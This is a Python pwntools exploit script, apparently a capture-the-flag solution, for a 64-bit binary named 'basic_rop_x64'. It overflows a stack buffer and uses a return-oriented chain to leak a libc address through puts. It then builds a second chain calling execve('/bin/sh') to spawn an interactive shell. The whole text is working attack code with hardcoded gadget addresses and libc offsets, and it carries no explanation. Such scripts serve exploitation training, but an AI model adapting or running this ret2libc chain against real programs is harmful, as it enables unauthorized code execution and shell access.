from pwn import *
context.update(log_level = 'debug')
p = process('basic_rop_x64')

p.recvrepeat(1)

libc = ELF('libc.so.6')
elf = ELF('basic_rop_x64')
addr_got_read = elf.got['read']
addr_plt_puts = elf.plt['puts']
addr_main = elf.symbols['main']
#0x0000000000400883 : pop rdi ; ret
addr_popRDI = 0x400883
payload = 'a'*0x48 + p64(addr_popRDI) + p64(addr_got_read) + p64(addr_plt_puts)
payload += p64(addr_main)
#raw_input('debug : ' + str(p.pid))
p.sendline(payload)
addr_libc_read = u64(p.recvrepeat(1).replace('\x0a', '')[-6:].ljust(8, '\x00'))
addr_libc_base = addr_libc_read - 0x110180
log.info('libc base : ' + hex(addr_libc_base))
log.info('libc read : ' + hex(addr_libc_read))


addr_binsh = addr_libc_base + list(libc.search('/bin/sh'))[0]
log.info('binsh : ' + hex(addr_binsh))
addr_popRSI = 0x0000000000400881
addr_popRDX = addr_libc_base + 0x0000000000001b92

addr_execve = addr_libc_base + libc.symbols['execve']
log.info('execve : ' + hex(addr_execve))
log.info('rdx : ' + hex(addr_popRDX))
payload = 'a'*0x48 + p64(addr_popRDI) + p64(addr_binsh) + p64(addr_popRSI) + p64(0) + p64(addr_popRDX) + p64(0) + p64(addr_execve)
raw_input('debug : ' + str(p.pid))
p.sendline(payload)
p.interactive()
